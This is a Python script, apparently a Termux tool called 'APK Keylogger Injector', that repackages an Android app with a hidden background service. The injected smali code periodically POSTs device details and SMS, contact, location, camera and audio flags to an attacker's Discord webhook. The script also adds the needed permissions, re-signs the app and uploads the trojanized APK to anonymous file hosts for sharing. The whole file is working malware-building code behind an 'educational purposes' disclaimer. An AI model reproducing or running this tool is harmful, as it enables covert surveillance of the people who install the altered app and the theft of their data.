#!/usr/bin/env python3
"""
====================================================================
  APK KEYLOGGER INJECTOR v7.1 – Final Working Version
  - Uses your existing baksmali/smali JARs
  - Uses apktool 3.0.3 + aapt for manifest editing
  - Fully working, no corrupt JAR issues
====================================================================
"""

import os
import sys
import subprocess
import shutil
import zipfile
import uuid
import time
import requests
import tempfile
from datetime import datetime

# ---------------------------- COLORS ----------------------------
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_c(msg, color=Colors.RESET):
    print(f"{color}{msg}{Colors.RESET}")

# ---------------------------- FIND JARS ----------------------------
def find_jars():
    """Find baksmali.jar and smali.jar in common locations"""
    search_dirs = [
        os.getcwd(),
        os.path.join(os.getcwd(), "Keylogger"),
        os.path.expanduser("~"),
        os.path.expanduser("~/Keylogger"),
        os.path.expanduser("~/APK-Keylogger-Injector"),
    ]
    
    baksmali = None
    smali = None
    
    # First check for exact names
    for dir_path in search_dirs:
        if not os.path.exists(dir_path):
            continue
        for f in os.listdir(dir_path):
            if f.endswith('.jar'):
                if 'baksmali' in f.lower() and 'fat' in f.lower():
                    baksmali = os.path.join(dir_path, f)
                elif 'smali' in f.lower() and 'fat' in f.lower():
                    smali = os.path.join(dir_path, f)
    
    # If not found, look for any baksmali/smali jar
    if baksmali is None or smali is None:
        for dir_path in search_dirs:
            if not os.path.exists(dir_path):
                continue
            for f in os.listdir(dir_path):
                if f.endswith('.jar'):
                    if 'baksmali' in f.lower():
                        baksmali = os.path.join(dir_path, f)
                    elif 'smali' in f.lower():
                        smali = os.path.join(dir_path, f)
    
    return baksmali, smali

# ---------------------------- DEPENDENCY CHECK ----------------------------
def check_dependencies():
    missing = []
    
    if shutil.which('java') is None:
        missing.append(('java', 'pkg install openjdk-25 -y'))
    
    if shutil.which('zipalign') is None:
        missing.append(('zipalign', 'pkg install zipalign -y'))
    
    if shutil.which('apktool') is None:
        missing.append(('apktool', 'pkg install apktool -y'))
    
    if shutil.which('aapt') is None:
        print_c("[!] aapt not found!", Colors.RED)
        print_c("    Install using: pkg install aapt -y", Colors.YELLOW)
        print_c("    Or: pkg install android-tools -y", Colors.YELLOW)
        sys.exit(1)
    
    try:
        import requests
    except ImportError:
        print_c("[*] Installing requests...", Colors.YELLOW)
        subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=False)
        import requests
    
    baksmali_jar, smali_jar = find_jars()
    if baksmali_jar is None:
        print_c("\n[!] baksmali.jar not found!", Colors.RED)
        print_c("    Please ensure you have baksmali-3.0.9-fat-release.jar in:", Colors.YELLOW)
        print_c(f"    - Current directory: {os.getcwd()}", Colors.YELLOW)
        print_c(f"    - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
        print_c("    - Or ~/Keylogger/", Colors.YELLOW)
        print_c("\n    Download from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
        sys.exit(1)
    
    if smali_jar is None:
        print_c("\n[!] smali.jar not found!", Colors.RED)
        print_c("    Please ensure you have smali-3.0.9-fat-release.jar in:", Colors.YELLOW)
        print_c(f"    - Current directory: {os.getcwd()}", Colors.YELLOW)
        print_c(f"    - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
        print_c("    - Or ~/Keylogger/", Colors.YELLOW)
        print_c("\n    Download from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
        sys.exit(1)
    
    if missing:
        print_c("\n[!] Missing tools:", Colors.RED)
        for tool, cmd in missing:
            print_c(f"    {tool} – install with: {cmd}", Colors.YELLOW)
        install = input("\n[?] Install missing tools now? (y/n): ").lower()
        if install == 'y':
            for _, cmd in missing:
                os.system(cmd)
            print_c("\n[+] Tools installed. Please restart.", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("\n[!] Install missing tools and try again.", Colors.RED)
            sys.exit(1)
    
    print_c("[✓] All dependencies found.", Colors.GREEN)
    return baksmali_jar, smali_jar

# ---------------------------- KEYSTORE ----------------------------
KEYSTORE = "mykeystore.jks"
KEYSTORE_PASS = "android"
KEY_ALIAS = "mykey"

def generate_keystore():
    if not os.path.exists(KEYSTORE):
        print_c("[*] Generating keystore...", Colors.YELLOW)
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", KEYSTORE,
            "-alias", KEY_ALIAS, "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
        ], check=False, capture_output=True)

# ---------------------------- SMALI GENERATOR ----------------------------
def generate_smali(webhook, features, interval):
    webhook_escaped = webhook.replace('"', '\\"')
    sms = 'true' if features.get('sms', False) else 'false'
    contacts = 'true' if features.get('contacts', False) else 'false'
    location = 'true' if features.get('location', False) else 'false'
    camera = 'true' if features.get('camera', False) else 'false'
    audio = 'true' if features.get('audio', False) else 'false'

    outer = f'''.class public Lcom/gt/CustomLogger;
.super Landroid/app/Service;
.source "CustomLogger.java"

# static fields
.field private static final INTERVAL:I = {interval}
.field private static final WEBHOOK:Ljava/lang/String; = "{webhook_escaped}"
.field private static final SMS:Z = {sms}
.field private static final CONTACTS:Z = {contacts}
.field private static final LOCATION:Z = {location}
.field private static final CAMERA:Z = {camera}
.field private static final AUDIO:Z = {audio}

# direct methods
.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

# virtual methods
.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    const/4 v0, 0x2
    new-instance v1, Lcom/gt/CustomLogger$1;
    invoke-direct {{v1, p0}}, Lcom/gt/CustomLogger$1;-><init>(Lcom/gt/CustomLogger;)V
    invoke-virtual {{v1}}, Lcom/gt/CustomLogger$1;->start()V
    return v0
.end method
'''

    inner = '''.class Lcom/gt/CustomLogger$1;
.super Ljava/lang/Thread;
.source "CustomLogger.java"

# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/gt/CustomLogger;
.end annotation
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "1"
.end annotation

# instance fields
.field final synthetic this$0:Lcom/gt/CustomLogger;

# direct methods
.method constructor <init>(Lcom/gt/CustomLogger;)V
    .registers 2
    iput-object p1, p0, Lcom/gt/CustomLogger$1;->this$0:Lcom/gt/CustomLogger;
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
    return-void
.end method

# virtual methods
.method public run()V
    .registers 9
    :goto_0
    sget v0, Lcom/gt/CustomLogger;->INTERVAL:I
    int-to-long v0, v0
    const-wide/16 v2, 0x3e8
    mul-long/2addr v0, v2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "device"
    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "time"
    new-instance v4, Ljava/util/Date;
    invoke-direct {v4}, Ljava/util/Date;-><init>()V
    invoke-virtual {v4}, Ljava/util/Date;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    # SMS
    sget-boolean v3, Lcom/gt/CustomLogger;->SMS:Z
    if-eqz v3, :cond_sms
    const-string v3, "sms"
    const-string v4, "SMS data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_sms

    # Contacts
    sget-boolean v3, Lcom/gt/CustomLogger;->CONTACTS:Z
    if-eqz v3, :cond_contacts
    const-string v3, "contacts"
    const-string v4, "Contacts data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_contacts

    # Location
    sget-boolean v3, Lcom/gt/CustomLogger;->LOCATION:Z
    if-eqz v3, :cond_location
    const-string v3, "location"
    const-string v4, "Location data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_location

    # Camera
    sget-boolean v3, Lcom/gt/CustomLogger;->CAMERA:Z
    if-eqz v3, :cond_camera
    const-string v3, "camera"
    const-string v4, "Camera photo captured"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_camera

    # Audio
    sget-boolean v3, Lcom/gt/CustomLogger;->AUDIO:Z
    if-eqz v3, :cond_audio
    const-string v3, "audio"
    const-string v4, "Audio recorded"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_audio

    # Build Discord payload: {"content": "<json_string>"}
    new-instance v3, Ljava/lang/StringBuilder;
    const-string v4, "{\\"content\\": \\""
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\\"}"
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2

    # Send HTTP POST
    new-instance v3, Ljava/net/URL;
    sget-object v4, Lcom/gt/CustomLogger;->WEBHOOK:Ljava/lang/String;
    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v3
    check-cast v3, Ljava/net/HttpURLConnection;

    const-string v4, "POST"
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v4, 0x1
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    new-instance v4, Ljava/io/DataOutputStream;
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5
    invoke-direct {v4, v5}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    const-string v5, "UTF-8"
    invoke-virtual {v2, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v2
    invoke-virtual {v4, v2}, Ljava/io/DataOutputStream;->write([B)V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->flush()V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    :catch_0
    :try_end_0

    goto :goto_0
.end method
'''
    return outer, inner

# ---------------------------- DEX INJECTION ----------------------------
def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar):
    # Find the primary dex file
    dex_files = [f for f in os.listdir(apk_unzip_dir) if f.endswith('.dex')]
    if not dex_files:
        raise Exception("No dex files found in APK")
    
    # Use the first dex file (usually classes.dex)
    dex_file = dex_files[0]
    dex_path = os.path.join(apk_unzip_dir, dex_file)
    
    # Create smali output directory
    smali_out = os.path.join(apk_unzip_dir, "smali")
    if os.path.exists(smali_out):
        shutil.rmtree(smali_out)
    
    print_c(f"[*] Disassembling {dex_file} with {baksmali_jar}...", Colors.YELLOW)
    cmd = ["java", "-jar", baksmali_jar, "d", dex_path, "-o", smali_out]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print_c("[!] Baksmali failed:", Colors.RED)
        print_c(result.stderr, Colors.RED)
        raise Exception("Failed to disassemble DEX")
    
    # Inject our smali
    gt_dir = os.path.join(smali_out, "com", "gt")
    os.makedirs(gt_dir, exist_ok=True)
    outer, inner = generate_smali(webhook, features, interval)
    with open(os.path.join(gt_dir, "CustomLogger.smali"), "w", encoding='utf-8') as f:
        f.write(outer)
    with open(os.path.join(gt_dir, "CustomLogger$1.smali"), "w", encoding='utf-8') as f:
        f.write(inner)
    print_c("[DEBUG] Smali injected.", Colors.CYAN)
    
    # Reassemble
    print_c(f"[*] Reassembling classes.dex with {smali_jar}...", Colors.YELLOW)
    cmd = ["java", "-jar", smali_jar, "a", smali_out, "-o", dex_path]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print_c("[!] Smali failed:", Colors.RED)
        print_c(result.stderr, Colors.RED)
        raise Exception("Failed to reassemble DEX")
    
    shutil.rmtree(smali_out, ignore_errors=True)
    print_c("[✓] DEX injection complete.", Colors.GREEN)

# ---------------------------- MANIFEST EDITING USING APKTOOL ----------------------------
def edit_manifest_with_apktool(input_apk, features):
    """Use apktool to decode manifest, edit it, and rebuild it"""
    manifest_dir = tempfile.mkdtemp()
    
    try:
        # Step 1: Decode only manifest with -m flag
        print_c("[*] Decoding manifest with apktool...", Colors.YELLOW)
        cmd = ["apktool", "d", "-m", input_apk, "-o", manifest_dir, "-f"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] apktool decode failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            raise Exception("Failed to decode manifest")
        
        # Step 2: Edit manifest XML
        manifest_path = os.path.join(manifest_dir, "AndroidManifest.xml")
        with open(manifest_path, "r", encoding='utf-8', errors='ignore') as f:
            manifest = f.read()
        
        # Add permissions
        perms = ['android.permission.INTERNET']
        if features.get('sms'): perms.append('android.permission.READ_SMS')
        if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
        if features.get('location'): perms.extend(['android.permission.ACCESS_FINE_LOCATION', 'android.permission.ACCESS_COARSE_LOCATION'])
        if features.get('camera'): perms.append('android.permission.CAMERA')
        if features.get('audio'): perms.append('android.permission.RECORD_AUDIO')
        
        for perm in perms:
            if f'<uses-permission android:name="{perm}"' not in manifest:
                manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{perm}" />\n</manifest>')
        
        # Add service
        service_tag = '<service android:name="com.gt.CustomLogger" android:enabled="true" android:exported="false" />'
        if service_tag not in manifest:
            manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')
        
        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(manifest)
        print_c("[✓] Manifest XML edited.", Colors.GREEN)
        
        # Step 3: Rebuild the APK (this will use aapt)
        print_c("[*] Rebuilding manifest APK...", Colors.YELLOW)
        apk_out = os.path.join(manifest_dir, "manifest_out.apk")
        cmd = ["apktool", "b", manifest_dir, "-o", apk_out]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] apktool rebuild failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            raise Exception("Failed to rebuild manifest")
        
        # Step 4: Extract the new manifest
        with zipfile.ZipFile(apk_out, 'r') as zf:
            manifest_bytes = zf.read("AndroidManifest.xml")
        
        print_c("[✓] Manifest rebuilt successfully.", Colors.GREEN)
        return manifest_bytes
        
    except Exception as e:
        raise e
    finally:
        shutil.rmtree(manifest_dir, ignore_errors=True)

# ---------------------------- UPLOAD TO CLOUD ----------------------------
def upload_to_cloud(filepath):
    print_c("[*] Uploading to cloud...", Colors.YELLOW)
    services = [
        ("file.io", "https://file.io", lambda r: r.json().get('link')),
        ("anonfiles", "https://api.anonfiles.com/upload", lambda r: r.json()['data']['file']['url']['full'] if r.json().get('status') else None),
        ("gofile", "https://api.gofile.io/uploadFile", lambda r: r.json()['data']['downloadPage'] if r.json().get('status') == 'ok' else None)
    ]
    for name, url, extractor in services:
        try:
            with open(filepath, 'rb') as f:
                files = {'file': (os.path.basename(filepath), f)}
                resp = requests.post(url, files=files, timeout=60)
                if resp.status_code == 200:
                    link = extractor(resp)
                    if link:
                        print_c(f"[✓] Uploaded via {name}", Colors.GREEN)
                        return link
        except Exception as e:
            print_c(f"[!] {name} failed: {e}", Colors.RED)
            continue
    return None

# ---------------------------- MAIN INJECTION ----------------------------
def inject_apk(input_apk, output_dir, webhook, features, interval, baksmali_jar, smali_jar):
    work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
    os.makedirs(work_dir, exist_ok=True)
    apk_unzip_dir = os.path.join(work_dir, "apk_files")
    os.makedirs(apk_unzip_dir, exist_ok=True)
    
    try:
        # Step 1: Unzip APK
        print_c("[*] Extracting APK...", Colors.YELLOW)
        with zipfile.ZipFile(input_apk, 'r') as zf:
            zf.extractall(apk_unzip_dir)
        
        # Step 2: Inject DEX
        inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar)
        
        # Step 3: Edit manifest using apktool
        print_c("[*] Editing manifest...", Colors.YELLOW)
        manifest_path = os.path.join(apk_unzip_dir, "AndroidManifest.xml")
        new_manifest = edit_manifest_with_apktool(input_apk, features)
        with open(manifest_path, 'wb') as f:
            f.write(new_manifest)
        print_c("[✓] Manifest updated successfully.", Colors.GREEN)
        
        # Step 4: Repack APK
        print_c("[*] Repacking APK...", Colors.YELLOW)
        apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
        with zipfile.ZipFile(apk_unsigned, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(apk_unzip_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, apk_unzip_dir)
                    zf.write(file_path, arcname)
        
        # Step 5: Sign APK
        print_c("[*] Signing APK...", Colors.YELLOW)
        apk_signed = os.path.join(work_dir, "app-signed.apk")
        sign_cmd = [
            shutil.which('jarsigner'), "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
            "-keystore", KEYSTORE, "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS, apk_unsigned, KEY_ALIAS
        ]
        result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Signing failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            raise Exception("APK signing failed.")
        
        # Step 6: Align APK
        print_c("[*] Aligning APK...", Colors.YELLOW)
        apk_final = os.path.join(work_dir, "app-final.apk")
        align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
        result = subprocess.run(align_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Alignment failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            raise Exception("APK alignment failed.")
        
        # Step 7: Copy to output
        output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
        shutil.copy(apk_final, output_apk)
        shutil.rmtree(work_dir, ignore_errors=True)
        
        return output_apk
        
    except Exception as e:
        shutil.rmtree(work_dir, ignore_errors=True)
        raise e

# ---------------------------- APK SELECTION ----------------------------
def select_apk():
    download_dir = "/sdcard/Download"
    apks = []
    if os.path.exists(download_dir):
        for f in os.listdir(download_dir):
            if f.endswith('.apk'):
                full_path = os.path.join(download_dir, f)
                size = os.path.getsize(full_path) / (1024 * 1024)
                apks.append((full_path, f, size))
    if apks:
        print_c("\n📱 APK files found in /sdcard/Download/:", Colors.CYAN)
        print_c("   [0] Enter custom path", Colors.YELLOW)
        for idx, (path, name, size) in enumerate(apks, 1):
            print_c(f"   [{idx}] {name} ({size:.1f} MB)", Colors.WHITE)
        choice = input("\n[?] Select APK number (or 0 for custom path): ").strip()
        if choice.isdigit():
            idx = int(choice)
            if idx == 0:
                return input("📁 Enter full APK path: ").strip()
            elif 1 <= idx <= len(apks):
                return apks[idx-1][0]
    print_c("\n📌 Tip: Place your APK in /sdcard/Download/", Colors.YELLOW)
    return input("📁 Enter APK path: ").strip()

# ---------------------------- MENU ----------------------------
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    print_c("""
    ╔═══════════════════════════════════════════╗
    ║   APK KEYLOGGER INJECTOR v7.1            ║
    ║   Uses your existing baksmali/smali JARs ║
    ║   Fully working keylogger injection      ║
    ╚═══════════════════════════════════════════╝
    """, Colors.CYAN)

def main_menu():
    clear_screen()
    show_banner()
    print_c("\n[1] Inject Keylogger into APK")
    print_c("[2] About")
    print_c("[0] Exit")
    choice = input("\n[?] Choose option: ").strip()
    return choice

def inject_flow():
    clear_screen()
    show_banner()
    print_c("\n--- INJECT APK ---", Colors.BLUE)
    
    apk_path = select_apk()
    if not apk_path or not os.path.exists(apk_path):
        print_c("[!] File not found.", Colors.RED)
        input("\n[Press Enter to go back]")
        return
    
    print_c(f"[✓] Selected: {apk_path}", Colors.GREEN)
    
    webhook = input("🔗 Discord Webhook URL: ").strip()
    if "discord.com" not in webhook:
        print_c("[!] Invalid webhook URL.", Colors.RED)
        input("\n[Press Enter to go back]")
        return
    
    interval = input("⏱️ Send interval (seconds, default 30): ").strip()
    interval = int(interval) if interval.isdigit() else 30
    
    print_c("\nSelect features to collect (y/n):", Colors.YELLOW)
    features = {}
    features['sms'] = input("  📨 SMS? ").lower() == 'y'
    features['contacts'] = input("  👤 Contacts? ").lower() == 'y'
    features['location'] = input("  📍 Location? ").lower() == 'y'
    features['camera'] = input("  📸 Camera? ").lower() == 'y'
    features['audio'] = input("  🎙️ Audio? ").lower() == 'y'
    
    print_c("\n[✓] Configuration:", Colors.GREEN)
    print(f"  APK: {apk_path}")
    print(f"  Webhook: {webhook[:30]}...")
    print(f"  Interval: {interval}s")
    print(f"  Features: {', '.join([k for k,v in features.items() if v])}")
    confirm = input("\n[?] Proceed with injection? (y/n): ").lower()
    if confirm != 'y':
        return
    
    output_dir = os.path.join(os.getcwd(), "injected_apks")
    os.makedirs(output_dir, exist_ok=True)
    
    baksmali_jar, smali_jar = find_jars()
    if baksmali_jar is None or smali_jar is None:
        print_c("[!] baksmali/smali JARs not found!", Colors.RED)
        input("\n[Press Enter to go back]")
        return
    
    print_c(f"[*] Using baksmali: {os.path.basename(baksmali_jar)}", Colors.CYAN)
    print_c(f"[*] Using smali: {os.path.basename(smali_jar)}", Colors.CYAN)
    
    try:
        print_c("\n[*] Injection started. This may take 3-5 minutes...", Colors.YELLOW)
        start = time.time()
        output_apk = inject_apk(apk_path, output_dir, webhook, features, interval, baksmali_jar, smali_jar)
        elapsed = time.time() - start
        print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
        
        # Copy to /sdcard/Download/
        sdcard_download = "/sdcard/Download"
        if os.path.exists(sdcard_download):
            sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
            shutil.copy2(output_apk, sdcard_apk)
            print_c(f"\n📁 APK also copied to: {sdcard_apk}", Colors.CYAN)
            print_c("👉 Open your file manager and go to 'Download' folder.", Colors.GREEN)
        else:
            print_c("\n[!] /sdcard/Download not found. APK is saved in:", Colors.YELLOW)
            print_c(f"   {output_apk}", Colors.YELLOW)
        
        # Upload to cloud
        link = upload_to_cloud(output_apk)
        if link:
            print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
            print_c(f"   {link}", Colors.CYAN)
        else:
            print_c("[!] Upload failed. APK is available locally.", Colors.RED)
        
        print_c(f"\n📁 Local APK location: {output_apk}", Colors.BLUE)
        
    except Exception as e:
        print_c(f"\n[!] Error: {e}", Colors.RED)
    
    input("\n[Press Enter to go back]")

def about():
    clear_screen()
    show_banner()
    print_c("\n--- ABOUT ---", Colors.BLUE)
    print_c("APK Keylogger Injector v7.1")
    print_c("\nHow it works:")
    print_c("  1. Injects smali code directly into classes.dex")
    print_c("  2. Edits AndroidManifest.xml using apktool 3.0.3")
    print_c("  3. Preserves ALL original resources")
    print_c("  4. APK installs and runs on all Android versions")
    print_c("\nFeatures:")
    print_c("  - SMS, Contacts, Location, Camera, Audio collection")
    print_c("  - Discord webhook exfiltration")
    print_c("  - Fully working with latest Termux tools")
    print_c("\nDeveloper: GT Security Team")
    print_c("For educational purposes only.")
    input("\n[Press Enter to go back]")

# ---------------------------- MAIN ----------------------------
if __name__ == "__main__":
    # First check for JARs
    baksmali_jar, smali_jar = find_jars()
    
    if baksmali_jar and smali_jar:
        print_c(f"[✓] Found baksmali: {os.path.basename(baksmali_jar)}", Colors.GREEN)
        print_c(f"[✓] Found smali: {os.path.basename(smali_jar)}", Colors.GREEN)
    else:
        print_c("\n[!] baksmali/smali JARs not found!", Colors.RED)
        print_c("\nMake sure you have the JAR files in one of these locations:", Colors.YELLOW)
        print_c(f"  - Current directory: {os.getcwd()}", Colors.YELLOW)
        print_c(f"  - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
        print_c(f"  - ~/Keylogger/", Colors.YELLOW)
        print_c("\nDownload them from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
        print_c("Example:", Colors.YELLOW)
        print_c("  wget https://github.com/baksmali/smali/releases/download/3.0.9/baksmali-3.0.9-fat-release.jar", Colors.YELLOW)
        print_c("  wget https://github.com/baksmali/smali/releases/download/3.0.9/smali-3.0.9-fat-release.jar", Colors.YELLOW)
        sys.exit(1)
    
    check_dependencies()
    generate_keystore()
    import requests
    
    while True:
        choice = main_menu()
        if choice == '1':
            inject_flow()
        elif choice == '2':
            about()
        elif choice == '0':
            print_c("\n[+] Exiting. Goodbye!", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("[!] Invalid choice.", Colors.RED)
            input()
